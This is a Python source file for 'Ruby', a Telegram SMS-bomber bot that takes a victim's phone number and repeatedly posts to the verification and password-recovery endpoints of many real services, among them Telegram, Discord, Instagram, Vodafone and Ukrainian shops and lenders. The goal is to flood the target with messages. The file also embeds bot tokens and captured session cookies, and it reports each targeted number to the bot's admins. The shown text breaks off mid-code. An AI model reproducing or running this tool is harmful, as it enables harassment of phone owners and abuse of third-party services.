import requests
import fake_useragent
import telebot
import time
from telebot import types
import phonenumbers
from phonenumbers import carrier
from phonenumbers import timezone
from phonenumbers import geocoder
import pickle
from datetime import datetime, timedelta

#pickle.dump( {"users":[], "bmb_numbers":[], "bmb_ids":[], "atk_times":{}, "atk_day":[]}, open("database.p", "wb") )
database = pickle.load( open( "database.p", "rb" ) )
token = '5251842328:AAGt_dqbJXa70Y65n3zwxY_FYnlwQiiOKCo'
bot = telebot.TeleBot(token)
logsbot = telebot.TeleBot("5151611034:AAEufeockTy06pH0vP_4Ft6YHGoSa6gIr5k")

admins = [615826481, 2001230282]

projinfo = '''
📌 Информация о боте:

👥 Админы:
├🍁 @termqew: создатель 
└🍁 @nothing_simple: админ

📰 Новости бомбера:
└ https://t.me/+hZK1rIDaFMk3ZWJi

📆 Дата старта бота:
└ 10.02.2022

📽️ Наши другие проекты:
└ @qewprojects

📱 Сервисы:
├🇺🇦 35 шт. на Украину
└🇷🇺 32 шт. на Россию
'''

print("Бот запущен")

def generate_info():
    global _name
    global _email
    global password
    global username
    _name = ''
    password = ''
    username = ''
    for x in range(12):
        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = password + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = password + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    _email = _name + '@gmail.com'

proxies = None
user = fake_useragent.UserAgent().random
headers = {'user_agent' : user}

item5 = types.KeyboardButton("👤 Мой профиль")
item1 = types.KeyboardButton("☄️ Начать бомбежку")
item2 = types.KeyboardButton("📊 Статистика")
item4 = types.KeyboardButton("📋 Информация о проекте")
country_ua = types.KeyboardButton("🇺🇦 Украина")
country_ru = types.KeyboardButton("🇷🇺 Россия")

cancel = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
cancel.add("🔴 Стоп")

def send_to_adms(text):
    for admin in admins:
        try:
            logsbot.send_message(admin, text)
        except:
            pass

database = pickle.load( open( "database.p", "rb" ) )
database["bmb_numbers"] = []
database["bmb_ids"] = []
pickle.dump( database, open("database.p", "wb") )

if token == '5251842328:AAGt_dqbJXa70Y65n3zwxY_FYnlwQiiOKCo':
    send_to_adms(f"Бот перезапущен успешно!✅ \n├🍁 Token: {token} \n├🍁 Оригинальность токена: True\n└🍁 Bot: @rubybomberbot")
else:
    send_to_adms(f"Бот перезапущен успешно!✅ \n├🍁 Token: {token} \n├🍁 Оригинальность токена: False\n└🍁 Bot: @rubybomberbot")



def atk_count():
    database = pickle.load( open( "database.p", "rb" ) )
    atk_times = database["atk_times"]
    all_atks = 0
    for user in atk_times:
        all_atks += atk_times[user]
    sorted_l = {k: v for k, v in sorted(atk_times.items(), key=lambda item: item[1])}

    cur_time = datetime.now()
    counter_d = 0
    for atk_time in database["atk_day"]:
        if "days" in str(cur_time-atk_time) or "day" in str(cur_time-atk_time):
            database["atk_day"].remove(atk_time)
        else:
            counter_d += 1

    pickle.dump( database, open("database.p", "wb") )

    return [all_atks, list(sorted_l.keys())[-2], counter_d]

def main_menu(message):
    keyboard = telebot.types.ReplyKeyboardMarkup(True)
    keyboard.row(item1)
    keyboard.row(item5)
    keyboard.row(item2, item4)
    bot.send_message(message.from_user.id, 'Вы находитесь в главном меню', reply_markup=keyboard )

@bot.message_handler(commands=['resetdbatacks'])
def reset_atacks():
    database = pickle.load( open( "database.p", "rb" ) )
    database["bmb_numbers"] = []
    database["bmb_ids"] = []
    pickle.dump( database, open("database.p", "wb") )

@bot.message_handler(commands=['start'])
def start_message(message):
    keyboard = telebot.types.ReplyKeyboardMarkup(True)
    keyboard.row(item1)
    keyboard.row(item5)
    keyboard.row(item2, item4)
    us_surname = message.from_user.last_name
    username = message.from_user.username
    us_name = message.from_user.first_name
    us_id = message.from_user.id
    with open ('hello.tgs', 'rb') as hello_sticker:
        bot.send_sticker(message.from_user.id, hello_sticker)
        bot.send_message(message.from_user.id, f'*👤Wassup, {message.from_user.first_name}* \n\n*Ruby* - *бесплатный* sms bomber. Работает на *страны СНГ(0 сервисов) и Украину(35 сервисов)*, при этом часто дополняеться новыми сервисами \n\nНаши дpугие проекты: @qewprojects', reply_markup=keyboard, parse_mode='Markdown')

    database = pickle.load( open( "database.p", "rb" ) )
    ids = []
    for full in database["users"]:
        ids.append(full[0])
    try:    
        if us_id not in ids:
            save_user(us_id, us_name, us_surname, username)
            if us_name == None:
                print("hui")
            else:
                send_to_adms(str("🥳Новый юзер теперь в боте:\n"+ "├🧙🏻 Логин: " + us_name + "\n├🧙🏻 Юзернейм: @" + username) )
    except Exception as e:
        print(e)

@bot.message_handler(commands=['users.csv'])
def send_to_adms_db(message):
    for admin in admins:
        try:
            with open('database.p', 'rb') as dbshka:
                logsbot.send_document(admin, dbshka)
        except:
            pass


def save_user(user_id: int, user_name: str, user_surname: str, username: str):
    database = pickle.load( open( "database.p", "rb" ) )
    database["users"].append([user_id, user_name, user_surname, username, datetime.now()])
    pickle.dump( database, open("database.p", "wb") )


def set_country(message):
    cuntry = telebot.types.ReplyKeyboardMarkup(True)
    cuntry.row(country_ua)
    cuntry.row(country_ru)
    bot.send_message(message.from_user.id, f'Теперь выбери страну (Определять по коду страны номера жертвы)', reply_markup=cuntry)
    
@bot.message_handler(content_types=['text'])
def poddgotovka(message):
    if message.text == "👤 Мой профиль":    
        database = pickle.load( open( "database.p", "rb" ) )
        for full in database["users"]:
            if message.from_user.id in full:
                reg_date = full[-1]
                break
        try:
            temp_count = database["atk_times"][message.from_user.username]
        except:
            temp_count = 0
        try:
            diff = (datetime.now() - reg_date + timedelta(days = 1)).days
            bot.send_message(message.from_user.id, f'⚜️ Добро пожаловать в свой профиль! ⚜️ \n\n🔑 Ваш id: {message.from_user.id} \n👁 Ваш логин: {message.from_user.first_name} \n\n🔥 Ваша статистика:\n├🍁 Дней в боте: {diff}\n└🍁 Количество атак: {temp_count}')
        except:
            bot.send_message(message.from_user.id, f'Вы еще не зарегистрированы в боте! Используйте <b>/start</b> для регистрации.', parse_mode='html')

    elif message.text == "☄️ Начать бомбежку":
        set_country(message)
    elif message.text == "📋 Информация о проекте":
       bot.send_message(message.from_user.id, projinfo) 
    elif message.text == "📊 Статистика":
        database = pickle.load( open( "database.p", "rb" ) )
        counter_result = atk_count()
        bot.send_message(message.from_user.id, f'📊 <b>Статистика</b> 📊 \n\n🔥Статистика бота в реальном времени: \n├🍁 Зарегестрировано юзеров: {len(database["users"])} \n├🍁 Количество атак за сегодня: {counter_result[2]}\n├🍁Количество атак всего:  {counter_result[0]}\n└📊Найбольше номеров атаковал: @{counter_result[1]}\n\n📊По поводу рекламы писать сюда: @termqew', parse_mode='html')
    elif message.text.split(" ")[0] == "send" and message.from_user.id in admins and len(message.text.split(" ")) > 1:
        database = pickle.load( open( "database.p", "rb" ) )
        for full in database["users"]:
            bot.send_message(full[0], message.text[5:], parse_mode='Markdown')
    elif message.text == "🇺🇦 Украина":
        phone = bot.send_message(message.from_user.id, f"📱Введите номер без + \n*Например*: \n🇺🇦380123456789 \n\n⏳Спам идет 5 циклов. По времени это 4 минуты", parse_mode='Markdown', reply_markup=cancel)
        bot.register_next_step_handler(phone, start_bombing_ua)
    elif message.text == "🇷🇺 Россия":
        phone_ru = bot.send_message(message.from_user.id, f"📱Введите номер без + \n*Например*: \n🇷🇺71234567890 \n\n⏳Спам идет 5 циклов. По времени это 4 минуты", parse_mode='Markdown', reply_markup=cancel)
        bot.register_next_step_handler(phone_ru, start_bombing_ru)
def start_bombing_ua(message):
    chat_id = message.from_user.id
    number = message.text
    if message.text == '🔴 Стоп':
        bot.clear_step_handler_by_chat_id(chat_id=message.chat.id)
        bot.send_message(message.from_user.id, f'✅Вы отменили атаку')
        main_menu(message)
        return
    try:
        database = pickle.load( open( "database.p", "rb" ) )

        if chat_id not in database["bmb_ids"]:
            database = pickle.load( open( "database.p", "rb" ) )
            database["bmb_ids"].append(chat_id)
            pickle.dump( database, open("database.p", "wb") )
        else:
            bot.send_message(message.from_user.id, f"Этот номер уже атакуеться! Подождите до конца завершения прошлих цыклов")
            main_menu(message)
            return

        if number not in database["bmb_numbers"]:
            database = pickle.load( open( "database.p", "rb" ) )
            database["bmb_numbers"].append(number)
            pickle.dump( database, open("database.p", "wb") )
        else:
            bot.send_message(message.from_user.id, f"Этот номер уже атакуеться! Подождите до конца завершения прошлих цыклов")
            return

        plusnumb = "+" + number
        z = phonenumbers.parse(plusnumb, None)
        name = message.from_user.first_name
        send_to_adms(f'💣Пользователь {name} хочет проспамить номер:  {number} ({z})')
           
        if z == False:
            bot.send_message(message.from_user.id, f"Номер не верный")
        else:
            database = pickle.load( open( "database.p", "rb" ) )
            try:
                database["atk_times"][message.from_user.username] += 1
            except:
                database["atk_times"][message.from_user.username] = 1
            database["atk_day"].append(datetime.now())
            pickle.dump( database, open("database.p", "wb") )

            main_menu(message)
            bot.send_message(message.from_user.id, "*📱Общая информация о номере:*" + "\n├" + str(z) + '\n├Страна - ' + str(geocoder.description_for_number(z, "ru")) + '\n├Оператор - ' + str(carrier.name_for_number(z, 'en')) + '\n╰Часовой пояс - ' + str(timezone.time_zones_for_number(z)), parse_mode='Markdown')
            bombedit = bot.send_message(message.chat.id, f'*✅Спам атака на номер {number} начата!* \n\nТут будет информация о статусе:', parse_mode='Markdown')
            for _ in range(5):
                bot.edit_message_text(chat_id=message.chat.id, message_id=bombedit.message_id, text=f'*✅Спам атака на номер {number} начата!* \n\nТут будет информация о статусе: \n🕙Подготовка нового цыкла', parse_mode='Markdown')
                bot.edit_message_text(chat_id=message.chat.id, message_id=bombedit.message_id, text=f'*✅Спам атака на номер {number} начата!* \n\nТут будет информация о статусе: \n💣Убиваю номер...', parse_mode='Markdown')
                try:
                    requests.post("https://www.liqpay.ua/apiweb/login/start", json={"phone": number, "token": "lp_91d8dedf4a311ad78604ec6b4e572ded001502bb"}, headers=headers, proxies=proxies)#https://www.liqpay.ua/ru/authorization
                except:
                    print('bla')
                try:#ok
                        requests.post('https://epicentrk.ua/api/person/v1/user/recoverypassword/sendrecoverycode/', data={'LANG_ID': 'ua','USER_LOGIN': '+' + number}, headers={'X-Requested-With':'XMLHttpRequest', 'p3p': 'policyref="/bitrix/p3p.xml", CP="NON DSP COR CUR ADM DEV PSA PSD OUR UNR BUS UNI COM NAV INT DEM STA"', 'strict-transport-security': 'max-age=15552000; includeSubDomains; preload', 'x-content-type-options': 'nosniff', 'x-frame-options': 'SAMEORIGIN', 'x-powered-by': 'PHP/7.4.25', 'x-powered-cms': 'Bitrix Site Manager (4bc356218be26e889085d220a9e786a6)', 'cookie': 'PHPSESSID=1t269iinndd7md5sqo8b7700ek; LANG=ua; LANG_SUBDOMAIN=ua; store-id=2; BITRIX_SM_LOCATION=def50200d1678734f41f460bcd67c0e7f652714c1d25112350930f045277c17c3fb7e18849564c70e87aff0cb6bdb7fb67ecb0f52d6c1f94ba2cd85eb71a663570f93e7c082af1b70d2dc0699c0fb92fbc1e91bb41207d55050bb0224e2049f81fb29a2b4d5d6a7539faad7f65c9ae4ecd446f2896174b6748a8b10ede7882533e4999299a0f81d0b443d6373f63abf0d4d77a0386c8a62ae62d4c5757efee8f1b9509531f037e80f3f36d177b52881abc9f9015eecb07a4cb6e96dc6dd1982b36c818a2c2204b33c9569da3b7dbc5cad5f5f533e9675802fe8eed5281c1395a5119240aa78011dbe5fb77c1d90995b614055cfeb2c5c0bd353151860c9c80f69d92e4459d62564c278acd490258744932689aaba880b2342988af8fce68527affbded359f5b8708c302a333dde73759c0fdf40a5ccc91180d1f372489007258c4daa195f06c65dcdde2dc4a2bfd9b840e1e70a8618cffeaff22df24bf4ddb740a4f1c303fa7c2c763c939fee7348d03aacd73f7fcfe6078a8497a90d143aa1d3fff2eb11a3e1e9e6fe984b7ae7737130645e4e8b9a37a482b36756a8c8f9210007219ddae33a4fe03dfc228771214786ad545a8f9609e470997effe16605c67292944fce82b5ead32856b755e854f0b23175b6e6a07f0a6a4909de9a0c9a27c4f622ebabeee2fbfc79e6767b8cfa5454ee04288b428606b2b7f8f06488379e59b7b82c84cc7637b8dee7dc4bdc66953e5c17943b028a0309ac2b808c27af7f7e48829e001815b729e95cc5e2e679e6b0597f506b32299651230a809f9831c19d0f8f60bf591323b85f09252505f23ded9779ec7a79b03835ae8cf22ce74933b69310979b3c2b51c630b9c2947e8b3bb6e37e8e86a7f11c97246a0e69f98d9f2b4119fd4f414817d14e88becaf74dec96c8fd19793f148465e34d5686192f8bec785f9769c68257a7d66e53c57959e910b52c72d62175c4ae80bb9807b88402ec75baea52fcb6798aaf0207652aefd32f398b61fe122141945a6728ad39266236784689291f53321c340e49cbfbbc848102bcd88adc3a1d6ccb5cf7e194077788dd8e29df092422a975a811e342476ef5ac9a6c666300f522bcf6efab10665930ca8cabcae0bf36bd79180f88e1faad119b77424df67ef529e4ff99c7d0f; BITRIX_SM_SALE_UID=923039850; __cf_bm=m.Ou9mYjkunw4v3prk5KThV3IsEiJ8jVbYutsIO8HQc-1635883869-0-AZdGHS57eMlrlhw5HODImuySQ6oD7owXlUEaV/ADBv28dDvqGGuJxLP5qXXIcIRcJqINHsgInJbBO9hIeRsCTUk=; _gcl_au=1.1.329786748.1635883887; epic_digital_sid=7889b9f5142983dee7f317fd460b3dc3; sc=8DC29604-D83A-CA43-1D7A-AEA55625A39A; BX_USER_ID=e9be5297d091d2b0a0648651770a6910; _gid=GA1.2.1712308472.1635883935; _hjid=367b87a5-a8e4-49df-9b28-e8bba9438837; _hjFirstSeen=1; _gaexp=GAX1.2.WlLos1ScS0WHGIPl3C-mtA.19018.x578; _dc_gtm_UA-69938460-2=1; _dc_gtm_UA-56814631-1=1; _dc_gtm_UA-69938460-1=1; _gat_UA-69938460-2=1; _hjIncludedInSessionSample=0; _hjAbsoluteSessionInProgress=0; _ga_VC9M164SVX=GS1.1.1635883886.1.1.1635883963.43; _ga=GA1.2.437891472.1635883935', 'referer': 'https://epicentrk.ua/ua/personal/restore/?forgot_password=yes&backurl=%2Fua%2Fpersonal%2Flogin%2F', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control':'no-store, no-cache, must-revalidate', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36', 'DNT':'1'})
                        print('epicentrk.ua')
                except:
                        print('Не доставлена (epicentrk.ua)')
                try:#ok
                        requests.post("https://my.xtra.tv/api/signup?lang=uk", data={"phone": number}, headers=headers)
                        print('my.xtra.tv')
                except:
                       print('ne vushlo')
                try:#ok
                        requests.post("https://bi.ua/api/v1/accounts", json={"grand_type": "sms_code", "login": "Сергей", "phone": number, "stage": "1"}, headers=headers)
                        print('bi.ua')
                except:
                        bot.edit_message_text(chat_id=message.chat.id, message_id=bombedit.message_id, text=f"Спам атака на номер {number} начата! \nТут будет информация об отправке: \n❌Сообщене не отправлено")
                try:#ok
                        requests.post("https://my.ctrs.com.ua/api/auth/login", data={"provider": "phone", "identity": number}, headers=headers)
                        print('ctrs')
                except:
                        bot.edit_message_text(chat_id=message.chat.id, message_id=bombedit.message_id, text=f"Спам атака на номер {number} начата! \nТут будет информация об отправке: \n❌Сообщене не отправлено")
                try:#ok
                        requests.post("https://my.telegram.org/auth/send_password", data={"phone": "+" + number}, headers=headers)
                        print('telegram')
                except:
                        bot.edit_message_text(chat_id=message.chat.id, message_id=bombedit.message_id, text=f"Спам атака на номер {number} начата! \nТут будет информация об отправке: \n❌Сообщене не отправлено")
                try:#no
                        requests.post("https://u.icq.net/api/v70/rapi/auth/sendCoden", params={"phone": number, "devId": "ic1rtwz1s1Hj1O0r"}, headers=headers)
                        print('icq')
                except:
                       print('Не отправлено (icq)')
                try:#ok/no
                        requests.post("https://discord.com/api/v9/auth/register/phone", json={"phone": "+" + number}, headers=headers)
                        print('discord')
                except:
                        print('Не отправлено (discord)')
                try:#ok
                        requests.post("https://registration.vodafone.ua/api/v1/process/smsCode", json={"number": number}, headers=headers)
                        print('vodafone')
                except:
                        print('Не отправлено (vodafone)')
                try:#ok
                        requests.post("https://megasport.ua/api/auth/phone/?language=ru", json={"phone": "+" + number}, headers=headers)
                        print('megasport')
                except:
                        print('Не отправлено (megasport)')
                try:#ok
                        requests.post("https://zolotakoroleva.ua/api/send-otp", json={"params": {"phone": "+" + number}}, headers=headers)
                        print('zolotakoroleva.ua')
                except:
                        print('Не отправлено (zolotakoroleva.ua)')
                try:#ok
                        requests.post("https://mozayka.com.ua/!processing/ajax.php", data={"phone": "+" + number, "mp_m": "sendsmscodereg", "token": "9d064a2beeb932ae5de11f74631269b4"}, headers=headers)
                        print('mozayka.com.ua')
                except:
                        print('Не отправлено (mozayka.com.ua)')
                try:#ok
                        requests.post("https://kazan-divan.eatery.club/site/v1/pre-login", json={"phone": number}, headers=headers)
                        print('kazan-divan.eatery.club')
                except:
                        print('Не доставлено (kazan-divan.eatery.club)')
                try:#ok
                        requests.post("https://admin1.groshivsim.com/api/sms/phone-verification/create", json={"phone": number}, headers=headers)
                        print('groshivsim.com')
                except:
                        print('Не отправлено (groshivsim.com)')
                try:#ok
                        requests.post("https://money4you.ua/api/clientRegistration/sendValidationSms", json={"fathersName": "Витальевич", "firstName": "Виталий", "lastName": "Соколов", "phone": "+" + number, "udriveEmployee": "false"}, headers=headers)
                        print('money4you.ua')
                except:
                        print('Не отправлено (money4you.ua)')
                try:
                        requests.post('https://www.instagram.com/accounts/account_recovery_send_ajax/', data={'email_or_username': number}, headers={'accept-encoding':'gzip, deflate, br', 'accept-language':'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7','content-type':'application/x-www-form-urlencoded', 'cookie':'ig_did=06389D42-D5BA-42C2-BCA6-49C2913D682B; csrftoken=SSEx9Bf0HmcQ8uCJVmh66Z4qBhu1F0iL; mid=XyIqeAALAAF1N7j0GbPCNuWhznuX; rur=FRC; urlgen="{\"109.252.48.249\": 25513\054 \"109.252.48.225\": 25513}:1k5JBz:E-7UgfDDLsdtlKvXiWBUphtFMdw"','referer':'https://www.instagram.com/accounts/password/reset/', 'origin':'https://www.instagram.com','user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 OPR/69.0.3686.95 (Edition Yx)','x-csrftoken':'SSEx9Bf0HmcQ8uCJVmh66Z4qBhu1F0iL', 'x-ig-app-id':'936619743392459','x-instagram-ajax': 'a9aec8fa634f', 'x-requested-with': 'XMLHttpRequest'})
                        print('instagram.com')
                except:
                        print('Не отправлено (instagram.com)')
                try:
                        requests.post('https://cabinet.taximaxim.ru/Services/Public.svc/api/v2/login/code/droppedcall/send?device=Xiaomi%2FMi+9T+Pro%2F10&locale=uk&source=playmarket&city=297&udid=ef94a46599d0e604&version=3.12.20&density=xxhdpi&platform=CLAPP_ANDROID&latitude=48.2552685&radius=47.861&rt=154436.516&longitude=25.9334519&sig=1411965450e7f390089c2cfab52ef029', json={'locale': 'uk','phone': number,'type':'droppedcall','smstoken':'vEMdSjfFO6R','isDefault':'1','mcc':'255'}, headers={'X-Requested-With':'XMLHttpRequest', 'Accept-Charset':'UTF-8', 'User-Agent':'Dalvik/2.1.0 (Linux; U; Android 10; Mi 9T Pro MIUI/V12.0.6.0.QFKMIXM)', 'X-Client-RequestTimeout':'10', 'Dark-Theme':'false', 'Url-Scheme':'maximzakaz', 'Connection':'Connection', 'Pragma':'no-cache', 'Cache-Control':'no-cache', 'Accept-Encoding':'gzip, deflate, br', 'DNT':'1'})
                        print('cabinet.taximaxim.ru')
                except:
                        print('Не отправлено (cabinet.taximaxim.ru)')
                try:
                        requests.post('https://md-fashion.com.ua/bpm/validate-contact', data={'phone': '+' + number}, headers=headers)
                        print('md-fashion.com.ua')
                except:
                        print('Не отправлено (md-fashion.com.ua)')
                try:#numberis
                        requests.post('https://be.budusushi.ua/login', data={'LoginForm[username]': phone[2:]}, headers={'X-Requested-With':'XMLHttpRequest', 'cookie': 'PHPSESSID=ql5hs8fs8bounfjnbehgrncrel; _gcl_au=1.1.1732122179.1637071555; _ga=GA1.2.781960988.1637071555; _gid=GA1.2.978787047.1637071555; _gat_UA-106901939-3=1', 'referer': 'https://budusushi.ua/', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control':'no-cache', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36', 'DNT':'1'})
                        print('be.budusushi.ua')
                except:
                        print('Не отправлено (be.budusushi.ua)')
                try:
                        requests.post('https://cp.soscredit.ua/graphql/portal', json={'operationName':'phoneVerification','variables':{'phone': '+' + number},'query':'mutation phoneVerification($phone: String!) {\n  phoneVerification(phone: $phone)\n}\n'}, headers={'X-Requested-With':'XMLHttpRequest', 'Cookie': 'lang=uk; device=efe1de42-b98b-454d-a621-347cd7d540b8; _gcl_au=1.1.1115308632.1634117698; _ga=GA1.2.612502580.1634117698; _hjid=933c789a-d48d-4173-9677-dc0ea09f9488; PHPSESSID=e17647c02c9f6cdae53a71c53c2604ce; cpaClickId=d15b045c-9bac-47d4-87bb-6a71137dc339; credit={"amount":3000,"term":15,"product_params_id":"26474253"}; promocode=; _gid=GA1.2.706473100.1635343152; _gaclientid=612502580.1634117698; sessionId=20211027|06098436; _gahitid=16:59:12; soscredit.ua_UTM=&utm_source=cpa&utm_medium=soscredit_partners_4; _dc_gtm_UA-88906892-1=1; _dc_gtm_UA-88906892-3=1; _hjAbsoluteSessionInProgress=1', 'Referer': 'https://cabinet.soscredit.ua/', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control':'no-store, no-cache, must-revalidate', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36', 'DNT':'1'})
                        print('soscredit.ua')
                except:
                        print('Не отправлено (soscredit.ua)')
                try:
                        requests.post('https://dnipro-m.ua/uk/phone-verification/', data={'phone': number}, headers={'X-Requested-With':'XMLHttpRequest', 'x-xss-protection': '1; mode=block', 'cookie': 'PHPSESSID=mjgof64ae33gd9g4rpto23utbs; session_hash=ecf0f036b9519cd8eae6640d1cb07bc2; gclid=939156d81035356c746423ecca0a2cf4a2748f879bd3dc65cfa6250fb7064ccea%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22gclid%22%3Bi%3A1%3Bs%3A8%3A%22dnipro-m%22%3B%7D; language=0480298520a8be04ccfd813520616a13a8aa0fb2db683a1126b77f187eca16c3a%3A2%3A%7Bi%3A0%3Bs%3A8%3A%22language%22%3Bi%3A1%3Bs%3A2%3A%22uk%22%3B%7D; translations_pushed=92f83c1f3a434aeae744854c974cdb236df315cbe39e518ed7234b1ea9a0cd88a%3A2%3A%7Bi%3A0%3Bs%3A19%3A%22translations_pushed%22%3Bi%3A1%3Bi%3A1%3B%7D; _csrf-frontend=bef2130445b5ccea33c7703f35273eab653c9ac5572def7b93a0fb02b25a556ca%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22SqzDL32pQojiQqc2Y50FzsdgD6Pmq8ma%22%3B%7D; _gcl_au=1.1.271637781.1635439209; _gcl_aw=GCL.1635439211.Cj0KCQjwlOmLBhCHARIsAGiJg7nuZzkVRYJJqzll_6EIBpIhK-TSb115GL3I5dVBdU9enJlXJrN7s0QaAqRqEALw_wcB; ab_1=2; _gid=GA1.2.377104572.1635439214; _dc_gtm_UA-87493814-1=1; _hjid=1ba8c8eb-f5de-4eb6-b07d-54a7b2e30c70; _hjFirstSeen=1; sc=C91E5BF3-A5C7-774E-FA5A-76E87C65E828; _gat_UA-87493814-1=1; _hjIncludedInSessionSample=0; _hjAbsoluteSessionInProgress=0; _ga_1QMTESJ6M0=GS1.1.1635439214.1.0.1635439215.59; _ga=GA1.2.2011064152.1635439214; __zlcmid=16mkRHVrtBTC1Fc; _gac_UA-87493814-1=1.1635439240.Cj0KCQjwlOmLBhCHARIsAGiJg7nuZzkVRYJJqzll_6EIBpIhK-TSb115GL3I5dVBdU9enJlXJrN7s0QaAqRqEALw_wcB', 'referer': 'https://dnipro-m.ua/uk/?gclid=Cj0KCQjwlOmLBhCHARIsAGiJg7nuZzkVRYJJqzll_6EIBpIhK-TSb115GL3I5dVBdU9enJlXJrN7s0QaAqRqEALw_wcB', 'x-csrf-token': 'koW-Ul6Vmcd9-M963uo7FTOT3bZQyePOrFDxs4Si7S3B9MQWEqartyyXpROPm1gnaqbt8Cq6h6noZqHe9ZqATA==', 'x-requested-with': 'XMLHttpRequest', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control':'no-store, no-cache, must-revalidate', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36', 'DNT':'1'})
                        print('dnipro-m.ua')
                except:
                        print('Не отправлено (dnipro-m.ua)')
                try:
                        requests.post('https://rider.uklon.com.ua/api/v1/phone/send-code', json={'username':'+' + number}, headers={'X-Requested-With':'XMLHttpRequest', 'strict-transport-security': 'max-age=15724800; includeSubDomains', 'x-correlation-id': 'c3208fdf-4dd7-4bca-aa84-2c686c1e2f60', 'sentry-trace': '796731cc91f54825a3e0435bebc67587-a104fb30d8b1adfc-1', 'uklon-agent': 'UklonPwa/1.16.0.182484', 'referer': 'https://m.uklon.com.ua/', 'locale': 'uk', 'client_id': '04F2BB99734848E1A061140A7452D1A9', 'app_uid': '9e33ffae-0ffd-4361-8bed-869b9ec94cb1', 'city': 'kyiv', 'cf-ray': '6a7f973a9ac12319-KBP', 'content-length': '0', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control':'no-cache', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36', 'DNT':'1'})
                        print('uklon.com.ua')
                except:
                        print('Не отправлено (uklon.com.ua)')
                try:
                        requests.post('https://ucb.z.apteka24.ua/api/send/otp', json={'phone':number}, headers={'X-Requested-With':'XMLHttpRequest', 'link': '<https://ucb.z.apteka24.ua/api/docs.jsonld>; rel="http://www.w3.org/ns/hydra/core#apiDocumentation"', 'server': 'nginx/1.17.10', 'vary': 'Accept', 'x-content-type-options': 'nosniff', 'x-frame-options': 'deny', 'x-powered-by': 'PHP/7.4.21', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control':'no-cache, private', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36', 'DNT':'1'})
                        print('apteka24.ua')
                except:
                        print('Не отправлено (apteka24.ua)')
                try:
                        requests.post('https://anc.ua/authorization/auth/v2/register', json={'login':'+' + number}, headers={'X-Requested-With':'XMLHttpRequest', 'server': 'cloudflare', 'strict-transport-security': 'max-age=15724800; includeSubDomains', 'x-content-type-options': 'nosniff', 'x-frame-options': 'DENY', 'x-xss-protection': '1; mode=block' , 'cookie': 'i18n_redirected=ru; sc=78E5A248-BB67-8529-17FB-C576B2F0C2C6; _gid=GA1.2.932161565.1636350376; _ga=GA1.2.323331122.1636350376; _gcl_au=1.1.1182428524.1636350380; _hjid=b16352a7-11da-4f6f-964a-b39c79b0686e; _hjFirstSeen=1; _hjAbsoluteSessionInProgress=0; _clck=1sxn18j|1|ew9|0; _clsk=oley8v|1636350383248|1|1|e.clarity.ms/collect; _ga_36VHWFTBMP=GS1.1.1636350372.1.1.1636350470.60; _dc_gtm_UA-169190421-1=1', 'referer': 'https://anc.ua/ru', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control':'no-cache, no-store, max-age=0, must-revalidate', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36', 'DNT':'1'})
                        print('anc.ua')
                except:
                        print('Не отправлено (anc.ua)')
                try:#numberis
                        requests.post('https://cscapp.vodafone.ua/eai_smob/start.swe?SWEExtSource=JSONConverter&SWEExtCmd=Execute', json={'params':{'version':'2.1.2','language':'ua','source':'WebApp','token':'null','manufacture':'','childNumber':'','accessType':'','spinner':'1'},'requests':{'loginV2':{'id':phone[3:]}}}, headers={'X-Requested-With':'XMLHttpRequest', 'SWEExtSource': 'JSONConverter', 'SWEExtCmd': 'Execute', 'vary': 'Accept-Encoding', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control':'no-cache', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36', 'DNT':'1'})
                        print('cscapp.vodafone.ua')
                except:
                        print('Не отправлено (cscapp.vodafone.ua)')
                try:#numberis
